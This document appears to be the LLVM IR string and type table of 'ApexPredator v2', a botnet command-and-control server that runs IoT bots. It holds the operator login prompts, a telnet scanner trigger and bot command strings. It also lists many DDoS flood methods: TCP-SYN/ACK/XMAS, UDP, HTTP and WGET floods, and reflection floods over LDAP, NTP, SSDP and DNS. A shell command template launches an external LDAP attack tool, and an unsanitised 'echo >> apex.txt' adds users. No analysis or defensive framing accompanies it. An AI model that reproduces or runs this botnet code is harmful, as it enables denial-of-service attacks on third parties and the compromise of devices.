; ModuleID = 'host/ir_O3/Apex_Predator.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.clientdata_t = type { i32, [7 x i8], i8 }
%struct.telnetdata_t = type { i32, i32 }
%struct.account = type { [20 x i8], [20 x i8], [20 x i8] }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }
%struct.tm = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i64, i8* }
%struct.epoll_event = type <{ i32, %union.epoll_data }>
%union.epoll_data = type { i8* }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.sockaddr = type { i16, [14 x i8] }
%union.pthread_attr_t = type { i64, [48 x i8] }
%struct.addrinfo = type { i32, i32, i32, i32, i32, %struct.sockaddr*, i8*, %struct.addrinfo* }

@clients = common local_unnamed_addr global [1000000 x %struct.clientdata_t] zeroinitializer, align 16
@managements = common local_unnamed_addr global [1000000 x %struct.telnetdata_t] zeroinitializer, align 16
@.str = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@epollFD = internal global i32 0, align 4
@listenFD = internal global i32 0, align 4
@.str.1 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@.str.2 = private unnamed_addr constant [10 x i8] c"epoll_ctl\00", align 1
@.str.3 = private unnamed_addr constant [15 x i8] c"!* SCANNER ON\0A\00", align 1
@.str.5 = private unnamed_addr constant [6 x i8] c"PONG\0A\00", align 1
@.str.6 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.7 = private unnamed_addr constant [11 x i8] c"buf: \22%s\22\0A\00", align 1
@.str.219 = private unnamed_addr constant [6 x i8] c"fcntl\00", align 1
@managesConnected = internal global i32 0, align 4
@.str.8 = private unnamed_addr constant [64 x i8] c"%c]0; ApexPredator v2 | IoT Devices: %d | Apex Predators: %d %c\00", align 1
@.str.9 = private unnamed_addr constant [9 x i8] c"apex.txt\00", align 1
@.str.10 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.11 = private unnamed_addr constant [36 x i8] c"\1B[1;37m[\1B[0;36m%d.%d.%d.%d\1B[1;37m]\0A\00", align 1
@.str.12 = private unnamed_addr constant [11 x i8] c"server.log\00", align 1
@.str.13 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.14 = private unnamed_addr constant [36 x i8] c"\0A\1B[1;37m[\1B[0;36m%d.%d.%d.%d\1B[1;37m]\00", align 1
@.str.15 = private unnamed_addr constant [6 x i8] c"admin\00", align 1
@accounts = internal global [25 x %struct.account] zeroinitializer, align 16
@.str.16 = private unnamed_addr constant [9 x i8] c"%s %s %s\00", align 1
@.str.18 = private unnamed_addr constant [32 x i8] c"\1B[0;31mUsername\1B[1;37m: \1B[1;37m\00", align 1
@.str.20 = private unnamed_addr constant [32 x i8] c"\1B[0;31mPassword\1B[1;37m: \1B[1;37m\00", align 1
@.str.21 = private unnamed_addr constant [11 x i8] c"\1B[2J\1B[1;1H\00", align 1
@.str.22 = private unnamed_addr constant [23 x i8] c"Login Attempt Saved.\0D\0A\00", align 1
@.str.23 = private unnamed_addr constant [56 x i8] c"Please contact the owner if you run into this issue!!\0D\0A\00", align 1
@.str.24 = private unnamed_addr constant [15 x i8] c"\1B[1A\1B[2J\1B[1;1H\00", align 1
@.str.25 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.26 = private unnamed_addr constant [49 x i8] c"\1B[1;37m              Welome to the \1B[1;31mApex\0D\0A\00", align 1
@.str.27 = private unnamed_addr constant [71 x i8] c"\1B[1;37m  A place where all the \1B[1;31mApex Predators\1B[1;37m hang out\0D\0A\00", align 1
@.str.28 = private unnamed_addr constant [56 x i8] c"\1B[1;37m              Version 2 [\1B[1;31mcustom\1B[1;37m]\0D\0A\00", align 1
@.str.29 = private unnamed_addr constant [28 x i8] c"\1B[1;31mApexPredator\1B[1;37m#\00", align 1
@.str.30 = private unnamed_addr constant [5 x i8] c"BOTS\00", align 1
@.str.31 = private unnamed_addr constant [5 x i8] c"bots\00", align 1
@.str.32 = private unnamed_addr constant [8 x i8] c"devices\00", align 1
@.str.33 = private unnamed_addr constant [8 x i8] c"DEVICES\00", align 1
@.str.34 = private unnamed_addr constant [141 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m.\1B[1;36mssh\1B[1;37m] - \1B[1;31m %d \0D\0A\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m.\1B[1;36musers\1B[1;37m] - \1B[1;31m %d \0D\0A\00", align 1
@.str.35 = private unnamed_addr constant [5 x i8] c"HELP\00", align 1
@.str.36 = private unnamed_addr constant [5 x i8] c"help\00", align 1
@.str.37 = private unnamed_addr constant [5 x i8] c"Help\00", align 1
@.str.38 = private unnamed_addr constant [68 x i8] c"\1B[1;37m[\1B[1;31m+\1B[1;37m]All Commands\1B[1;37m[\1B[1;31m+\1B[1;37m]     \0D\0A\00", align 1
@.str.39 = private unnamed_addr constant [84 x i8] c"\1B[1;37m[\1B[1;31m+\1B[1;37m]---------------------------------------------------------\0D\0A\00", align 1
@.str.40 = private unnamed_addr constant [52 x i8] c"\1B[1;37m[\1B[1;31mClear Screen\1B[1;37m]         CLEAR\0D\0A\00", align 1
@.str.41 = private unnamed_addr constant [53 x i8] c"\1B[1;37m[\1B[1;32mLOGOUT\1B[1;37m]               LOGOUT\0D\0A\00", align 1
@.str.42 = private unnamed_addr constant [52 x i8] c"\1B[1;37m[\1B[1;33mUsable Ports\1B[1;37m]         PORTS\0D\0A\00", align 1
@.str.43 = private unnamed_addr constant [52 x i8] c"\1B[1;37m[\1B[1;34mRules\1B[1;37m]                RULES\0D\0A\00", align 1
@.str.44 = private unnamed_addr constant [52 x i8] c"\1B[1;37m[\1B[1;36mSpoofing Methods\1B[1;37m]     SPOOF\0D\0A\00", align 1
@.str.45 = private unnamed_addr constant [54 x i8] c"\1B[1;37m[\1B[1;31mSpecial Commands\1B[1;37m]     SPECIAL\0D\0A\00", align 1
@.str.46 = private unnamed_addr constant [53 x i8] c"\1B[1;37m[\1B[1;32mScanning Commands\1B[1;37m]    REAPER\0D\0A\00", align 1
@.str.47 = private unnamed_addr constant [53 x i8] c"\1B[1;37m[\1B[1;33mStressing Commands\1B[1;37m]   STRESS\0D\0A\00", align 1
@.str.48 = private unnamed_addr constant [7 x i8] c"STRESS\00", align 1
@.str.49 = private unnamed_addr constant [7 x i8] c"stress\00", align 1
@.str.50 = private unnamed_addr constant [5 x i8] c"ddos\00", align 1
@.str.51 = private unnamed_addr constant [5 x i8] c"DDOS\00", align 1
@.str.52 = private unnamed_addr constant [72 x i8] c"\1B[1;37m[\1B[1;31m+\1B[1;37m] Method Listings\1B[1;37m[\1B[1;31m+\1B[1;37m]     \0D\0A\00", align 1
@.str.53 = private unnamed_addr constant [58 x i8] c"\1B[1;37m[\1B[1;31mLayer4 UDP\1B[1;37m]               L4UDP  \0D\0A\00", align 1
@.str.54 = private unnamed_addr constant [58 x i8] c"\1B[1;37m[\1B[1;31mLayer4 TCP\1B[1;37m]               L4TCP  \0D\0A\00", align 1
@.str.55 = private unnamed_addr constant [60 x i8] c"\1B[1;37m[\1B[1;31mLayer4 Spoofing\1B[1;37m]          L4SPOOF  \0D\0A\00", align 1
@.str.56 = private unnamed_addr constant [55 x i8] c"\1B[1;37m[\1B[1;31mLayer7\1B[1;37m]                   L7  \0D\0A\00", align 1
@.str.57 = private unnamed_addr constant [6 x i8] c"L4UDP\00", align 1
@.str.58 = private unnamed_addr constant [6 x i8] c"l4udp\00", align 1
@.str.59 = private unnamed_addr constant [6 x i8] c"l4UDP\00", align 1
@.str.60 = private unnamed_addr constant [6 x i8] c"L4udp\00", align 1
@.str.61 = private unnamed_addr constant [76 x i8] c"\1B[1;37m[\1B[1;31m+\1B[1;37m] Layer 4 UDP Listing\1B[1;37m[\1B[1;31m+\1B[1;37m]     \0D\0A\00", align 1
@.str.62 = private unnamed_addr constant [114 x i8] c"\1B[1;37m[\1B[1;31mUDP Flood\1B[1;37m]    !* UDP  [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m] 32 0 1\0D\0A\00", align 1
@.str.63 = private unnamed_addr constant [107 x i8] c"\1B[1;37m[\1B[1;31mSTD Flood\1B[1;37m]    !* STD  [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.64 = private unnamed_addr constant [107 x i8] c"\1B[1;37m[\1B[1;31mHOLD Flood\1B[1;37m]   !* HOLD [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.65 = private unnamed_addr constant [107 x i8] c"\1B[1;37m[\1B[1;31mJUNK Flood\1B[1;37m]   !* JUNK [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.66 = private unnamed_addr constant [113 x i8] c"\1B[1;37m[\1B[1;31mCNC Flood\1B[1;37m]    !* CNC  [\1B[1;31mIP\1B[1;37m] [\1B[1;31mADMIN PORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.67 = private unnamed_addr constant [6 x i8] c"L4TCP\00", align 1
@.str.68 = private unnamed_addr constant [6 x i8] c"l4tcp\00", align 1
@.str.69 = private unnamed_addr constant [6 x i8] c"l4TCP\00", align 1
@.str.70 = private unnamed_addr constant [6 x i8] c"L4tcp\00", align 1
@.str.71 = private unnamed_addr constant [76 x i8] c"\1B[1;37m[\1B[1;31m+\1B[1;37m] Layer 4 TCP Listing\1B[1;37m[\1B[1;31m+\1B[1;37m]     \0D\0A\00", align 1
@.str.72 = private unnamed_addr constant [119 x i8] c"\1B[1;37m[\1B[1;31mTCP-ALL Flood\1B[1;37m]  !* TCP [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m] 32 ALL 0 1\0D\0A\00", align 1
@.str.73 = private unnamed_addr constant [119 x i8] c"\1B[1;37m[\1B[1;31mTCP-SYN Flood\1B[1;37m]  !* TCP [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m] 32 SYN 0 1\0D\0A\00", align 1
@.str.74 = private unnamed_addr constant [119 x i8] c"\1B[1;37m[\1B[1;31mTCP-FIN Flood\1B[1;37m]  !* TCP [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m] 32 FIN 0 1\0D\0A\00", align 1
@.str.75 = private unnamed_addr constant [119 x i8] c"\1B[1;37m[\1B[1;31mTCP-RST Flood\1B[1;37m]  !* TCP [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m] 32 RST 0 1\0D\0A\00", align 1
@.str.76 = private unnamed_addr constant [119 x i8] c"\1B[1;37m[\1B[1;31mTCP-PSH Flood\1B[1;37m]  !* TCP [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m] 32 PSH 0 1\0D\0A\00", align 1
@.str.77 = private unnamed_addr constant [119 x i8] c"\1B[1;37m[\1B[1;31mTCP-CRI Flood\1B[1;37m]  !* TCP [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m] 32 CRI 0 1\0D\0A\00", align 1
@.str.78 = private unnamed_addr constant [119 x i8] c"\1B[1;37m[\1B[1;31mTCP-PRO Flood\1B[1;37m]  !* TCP [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m] 32 PRO 0 1\0D\0A\00", align 1
@.str.79 = private unnamed_addr constant [119 x i8] c"\1B[1;37m[\1B[1;31mTCP-ACK Flood\1B[1;37m]  !* TCP [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m] 32 ACK 0 1\0D\0A\00", align 1
@.str.80 = private unnamed_addr constant [120 x i8] c"\1B[1;37m[\1B[1;31mTCP-XMAS Flood\1B[1;37m] !* TCP [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m] 32 XMAS 0 1\0D\0A\00", align 1
@.str.81 = private unnamed_addr constant [3 x i8] c"L7\00", align 1
@.str.82 = private unnamed_addr constant [3 x i8] c"l7\00", align 1
@.str.83 = private unnamed_addr constant [7 x i8] c"layer7\00", align 1
@.str.84 = private unnamed_addr constant [7 x i8] c"Layer7\00", align 1
@.str.85 = private unnamed_addr constant [7 x i8] c"LAYER7\00", align 1
@.str.86 = private unnamed_addr constant [79 x i8] c"\1B[1;37m[\1B[1;31m+\1B[1;37m] Layer 7 Method Listing\1B[1;37m[\1B[1;31m+\1B[1;37m]     \0D\0A\00", align 1
@.str.87 = private unnamed_addr constant [88 x i8] c"\1B[1;37m[\1B[1;31mHTTP Flood\1B[1;37m]   !* HTTP  [\1B[1;31mURL\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.88 = private unnamed_addr constant [88 x i8] c"\1B[1;37m[\1B[1;31mWGET Flood\1B[1;37m]   !* WGET  [\1B[1;31mURL\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.89 = private unnamed_addr constant [8 x i8] c"L4SPOOF\00", align 1
@.str.90 = private unnamed_addr constant [8 x i8] c"l4spoof\00", align 1
@.str.91 = private unnamed_addr constant [8 x i8] c"l4SPOOF\00", align 1
@.str.92 = private unnamed_addr constant [73 x i8] c"\1B[1;37m[\1B[1;31m+\1B[1;37m]Spoofing Commands\1B[1;37m[\1B[1;31m+\1B[1;37m]     \0D\0A\00", align 1
@.str.93 = private unnamed_addr constant [113 x i8] c"\1B[1;37m[\1B[1;31mLDAP Flood\1B[1;37m]     !* LDAP     [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.94 = private unnamed_addr constant [113 x i8] c"\1B[1;37m[\1B[1;32mNTP Flood\1B[1;37m]      !* NTP      [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.95 = private unnamed_addr constant [113 x i8] c"\1B[1;37m[\1B[1;33mSSDP Flood\1B[1;37m]     !* SSDP     [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.96 = private unnamed_addr constant [113 x i8] c"\1B[1;37m[\1B[1;34mDNS Flood\1B[1;37m]      !* DNS      [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.97 = private unnamed_addr constant [113 x i8] c"\1B[1;37m[\1B[1;35mREAPER Flood\1B[1;37m]   !* REAPER   [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.98 = private unnamed_addr constant [113 x i8] c"\1B[1;37m[\1B[1;36mMSSQL Flood\1B[1;37m]    !* MSSQL    [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.99 = private unnamed_addr constant [113 x i8] c"\1B[1;37m[\1B[1;31mPORTMAP Flood\1B[1;37m]  !* PORTMAP  [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.100 = private unnamed_addr constant [113 x i8] c"\1B[1;37m[\1B[1;32mTS3 Flood\1B[1;37m]      !* TS3      [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.101 = private unnamed_addr constant [113 x i8] c"\1B[1;37m[\1B[1;33mSENTINEL Flood\1B[1;37m] !* SENTINEL [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.102 = private unnamed_addr constant [74 x i8] c"\1B[1;37m[\1B[1;31m+\1B[1;37m]Reflection Listing\1B[1;37m[\1B[1;31m+\1B[1;37m]     \0D\0A\00", align 1
@.str.103 = private unnamed_addr constant [41 x i8] c"\1B[1;37m[\1B[1;31mLDAP\1B[1;37m]:\1B[1;31m 0 \0D\0A\00", align 1
@.str.104 = private unnamed_addr constant [39 x i8] c"\1B[1;37m[\1B[1;32mNTP\1B[1;37m]:\1B[1;31m 0\0D\0A\00", align 1
@.str.105 = private unnamed_addr constant [40 x i8] c"\1B[1;37m[\1B[1;33mSSDP\1B[1;37m]:\1B[1;31m 0\0D\0A\00", align 1
@.str.106 = private unnamed_addr constant [39 x i8] c"\1B[1;37m[\1B[1;34mDNS\1B[1;37m]:\1B[1;31m 0\0D\0A\00", align 1
@.str.107 = private unnamed_addr constant [42 x i8] c"\1B[1;37m[\1B[1;35mREAPER\1B[1;37m]:\1B[1;31m 0\0D\0A\00", align 1
@.str.108 = private unnamed_addr constant [41 x i8] c"\1B[1;37m[\1B[1;36mMSSQL\1B[1;37m]:\1B[1;31m 0\0D\0A\00", align 1
@.str.109 = private unnamed_addr constant [43 x i8] c"\1B[1;37m[\1B[1;31mPORTMAP\1B[1;37m]:\1B[1;31m 0\0D\0A\00", align 1
@.str.110 = private unnamed_addr constant [39 x i8] c"\1B[1;37m[\1B[1;32mTS3\1B[1;37m]:\1B[1;31m 0\0D\0A\00", align 1
@.str.111 = private unnamed_addr constant [44 x i8] c"\1B[1;37m[\1B[1;33mSENTINEL\1B[1;37m]:\1B[1;31m 0\0D\0A\00", align 1
@.str.112 = private unnamed_addr constant [8 x i8] c"SPECIAL\00", align 1
@.str.113 = private unnamed_addr constant [6 x i8] c"ADMIN\00", align 1
@.str.114 = private unnamed_addr constant [6 x i8] c"Admin\00", align 1
@.str.115 = private unnamed_addr constant [8 x i8] c"special\00", align 1
@.str.116 = private unnamed_addr constant [72 x i8] c"\1B[1;37m[\1B[1;31m+\1B[1;37m]Special Commands\1B[1;37m[\1B[1;31m+\1B[1;37m]     \0D\0A\00", align 1
@.str.117 = private unnamed_addr constant [95 x i8] c"\1B[1;37m[\1B[1;31mAdds User\1B[1;37m]         root_add  [\1B[1;31mUSER\1B[1;37m] [\1B[1;31mPASS\1B[1;37m]\0D\0A\00", align 1
@.str.118 = private unnamed_addr constant [72 x i8] c"\1B[1;37m[\1B[1;32mIP Geolocation\1B[1;37m]    root_geo  [\1B[1;31mIP\1B[1;37m]\0D\0A\00", align 1
@.str.119 = private unnamed_addr constant [73 x i8] c"\1B[1;37m[\1B[1;33mSubDomain Scanner\1B[1;37m] root_sub  [\1B[1;31mURL\1B[1;37m]\0D\0A\00", align 1
@.str.120 = private unnamed_addr constant [72 x i8] c"\1B[1;37m[\1B[1;34mPort Scanner\1B[1;37m]      root_scan [\1B[1;31mIP\1B[1;37m]\0D\0A\00", align 1
@.str.121 = private unnamed_addr constant [73 x i8] c"\1B[1;37m[\1B[1;35mCloudFlare Bypass\1B[1;37m] root_cf   [\1B[1;31mURL\1B[1;37m]\0D\0A\00", align 1
@.str.122 = private unnamed_addr constant [7 x i8] c"LOGOUT\00", align 1
@.str.123 = private unnamed_addr constant [77 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] User:[\1B[0;36m%s\1B[1;37m] Has Logged Out!\0A\00", align 1
@.str.124 = private unnamed_addr constant [11 x i8] c"LOGOUT.log\00", align 1
@.str.125 = private unnamed_addr constant [7 x i8] c"logout\00", align 1
@.str.126 = private unnamed_addr constant [5 x i8] c"MOVE\00", align 1
@.str.127 = private unnamed_addr constant [5 x i8] c"move\00", align 1
@.str.128 = private unnamed_addr constant [95 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] User:[\1B[0;36m%s\1B[1;37m] Has Attempted To Shell Your Bots!\0A\00", align 1
@.str.129 = private unnamed_addr constant [10 x i8] c"SHELL.log\00", align 1
@.str.130 = private unnamed_addr constant [94 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] User: \1B[0;36m%s\1B[1;37m Has Attempted To Shell Your Bots!\0A\00", align 1
@.str.131 = private unnamed_addr constant [8 x i8] c"!* STOP\00", align 1
@.str.132 = private unnamed_addr constant [12 x i8] c"!* KILLATTK\00", align 1
@.str.133 = private unnamed_addr constant [25 x i8] c"[Reaper] Attack Stopped!\00", align 1
@.str.134 = private unnamed_addr constant [7 x i8] c"!* UDP\00", align 1
@.str.135 = private unnamed_addr constant [71 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mUDP \1B[1;37mFlood!\0D\0A\00", align 1
@.str.136 = private unnamed_addr constant [7 x i8] c"!* STD\00", align 1
@.str.137 = private unnamed_addr constant [71 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mSTD \1B[1;37mFlood!\0D\0A\00", align 1
@.str.138 = private unnamed_addr constant [8 x i8] c"resolve\00", align 1
@.str.139 = private unnamed_addr constant [8 x i8] c"RESOLVE\00", align 1
@.str.140 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.141 = private unnamed_addr constant [66 x i8] c"Resolved \1B[1;37m[\1B[0;31m%s\1B[1;37m] to \1B[1;37m[\1B[0;31m%s\1B[1;37m]\0D\0A\00", align 1
@.str.142 = private unnamed_addr constant [60 x i8] c"\1B[1;37mYou Dont Have Permission To Use This\1B[0;31m!\1B[1;37\0D\0A\00", align 1
@.str.143 = private unnamed_addr constant [8 x i8] c"adduser\00", align 1
@.str.144 = private unnamed_addr constant [8 x i8] c"ADDUSER\00", align 1
@.str.145 = private unnamed_addr constant [22 x i8] c"echo '%s' >> apex.txt\00", align 1
@.str.146 = private unnamed_addr constant [90 x i8] c"\1B[1;37m[\1B[1;31mApex\1B[1;37m] \1B[1;37mUser:[\1B[0;36m%s\1B[1;37m] Added User:[\1B[0;36m%s\1B[1;37m]\0A\00", align 1
@.str.147 = private unnamed_addr constant [91 x i8] c"\1B[1;37m[\1B[1;31mApex\1B[1;37m] \1B[1;37mUser:[\1B[0;36m%s\1B[1;37m] Added User:[\1B[0;36m%s\1B[1;37m]\0D\0A\00", align 1
@.str.148 = private unnamed_addr constant [7 x i8] c"!* CNC\00", align 1
@.str.149 = private unnamed_addr constant [71 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mCNC \1B[1;37mFlood!\0D\0A\00", align 1
@.str.150 = private unnamed_addr constant [8 x i8] c"!* HTTP\00", align 1
@.str.151 = private unnamed_addr constant [72 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mHTTP \1B[1;37mFlood!\0D\0A\00", align 1
@.str.152 = private unnamed_addr constant [8 x i8] c"!* JUNK\00", align 1
@.str.153 = private unnamed_addr constant [8 x i8] c"!* HOLD\00", align 1
@.str.154 = private unnamed_addr constant [7 x i8] c"!* TCP\00", align 1
@.str.155 = private unnamed_addr constant [57 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Loading sockets...\0D\0A\00", align 1
@.str.156 = private unnamed_addr constant [8 x i8] c"!* WGET\00", align 1
@.str.157 = private unnamed_addr constant [72 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mWGET \1B[1;37mFlood!\0D\0A\00", align 1
@.str.158 = private unnamed_addr constant [5 x i8] c"XMAS\00", align 1
@.str.159 = private unnamed_addr constant [124 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mT\1B[1;32mC\1B[1;33mP\1B[1;34m-\1B[1;35mX\1B[1;36mM\1B[1;31mA\1B[1;32mS \1B[1;37mFlood\0D\0A\00", align 1
@.str.160 = private unnamed_addr constant [4 x i8] c"ALL\00", align 1
@.str.161 = private unnamed_addr constant [103 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mTCP \1B[1;37mFlood using \1B[1;31mALL \1B[1;37mMethods!\0D\0A\00", align 1
@.str.162 = private unnamed_addr constant [4 x i8] c"SYN\00", align 1
@.str.163 = private unnamed_addr constant [74 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[0;36mTCP-SYN \1B[1;37mFlood\0D\0A\00", align 1
@.str.164 = private unnamed_addr constant [4 x i8] c"FIN\00", align 1
@.str.165 = private unnamed_addr constant [74 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[0;36mTCP-FIN \1B[1;37mFlood\0D\0A\00", align 1
@.str.166 = private unnamed_addr constant [4 x i8] c"RST\00", align 1
@.str.167 = private unnamed_addr constant [74 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[0;36mTCP-RST \1B[1;37mFlood\0D\0A\00", align 1
@.str.168 = private unnamed_addr constant [4 x i8] c"ACK\00", align 1
@.str.169 = private unnamed_addr constant [74 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[0;36mTCP-ACK \1B[1;37mFlood\0D\0A\00", align 1
@.str.170 = private unnamed_addr constant [4 x i8] c"PSH\00", align 1
@.str.171 = private unnamed_addr constant [74 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[0;36mTCP-PSH \1B[1;37mFlood\0D\0A\00", align 1
@.str.172 = private unnamed_addr constant [4 x i8] c"PRO\00", align 1
@.str.173 = private unnamed_addr constant [74 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[0;36mTCP-PRO \1B[1;37mFlood\0D\0A\00", align 1
@.str.174 = private unnamed_addr constant [4 x i8] c"CRI\00", align 1
@.str.175 = private unnamed_addr constant [74 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[0;36mTCP-CRI \1B[1;37mFlood\0D\0A\00", align 1
@.str.176 = private unnamed_addr constant [5 x i8] c"ldap\00", align 1
@.str.177 = private unnamed_addr constant [5 x i8] c"LDAP\00", align 1
@.str.178 = private unnamed_addr constant [30 x i8] c"./ldap %s %s ldap.txt 2 -1 %s\00", align 1
@.str.179 = private unnamed_addr constant [70 x i8] c"[ApexPredator] Sending LDAP Attack to %s On Port %s For %s Seconds! \0A\00", align 1
@.str.180 = private unnamed_addr constant [10 x i8] c"root_ssdp\00", align 1
@.str.181 = private unnamed_addr constant [72 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mSSDP \1B[1;37mFlood!\0D\0A\00", align 1
@.str.182 = private unnamed_addr constant [9 x i8] c"root_ntp\00", align 1
@.str.183 = private unnamed_addr constant [71 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mNTP \1B[1;37mFlood!\0D\0A\00", align 1
@.str.184 = private unnamed_addr constant [14 x i8] c"root_sentinel\00", align 1
@.str.185 = private unnamed_addr constant [76 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mSENTINEL \1B[1;37mFlood!\0D\0A\00", align 1
@.str.186 = private unnamed_addr constant [9 x i8] c"root_dns\00", align 1
@.str.187 = private unnamed_addr constant [71 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mDNS \1B[1;37mFlood!\0D\0A\00", align 1
@.str.188 = private unnamed_addr constant [12 x i8] c"root_reaper\00", align 1
@.str.189 = private unnamed_addr constant [80 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mApexPredator \1B[1;37mFlood!\0D\0A\00", align 1
@.str.190 = private unnamed_addr constant [11 x i8] c"root_mssql\00", align 1
@.str.191 = private unnamed_addr constant [73 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mMSSQL \1B[1;37mFlood!\0D\0A\00", align 1
@.str.192 = private unnamed_addr constant [13 x i8] c"root_portmap\00", align 1
@.str.193 = private unnamed_addr constant [75 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mPORTMAP \1B[1;37mFlood!\0D\0A\00", align 1
@.str.194 = private unnamed_addr constant [9 x i8] c"root_ts3\00", align 1
@.str.195 = private unnamed_addr constant [71 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mTS3 \1B[1;37mFlood!\0D\0A\00", align 1
@.str.196 = private unnamed_addr constant [14 x i8] c"!* SCANNER ON\00", align 1
@.str.197 = private unnamed_addr constant [25 x i8] c"TELNET SCANNER STARTED\0D\0A\00", align 1
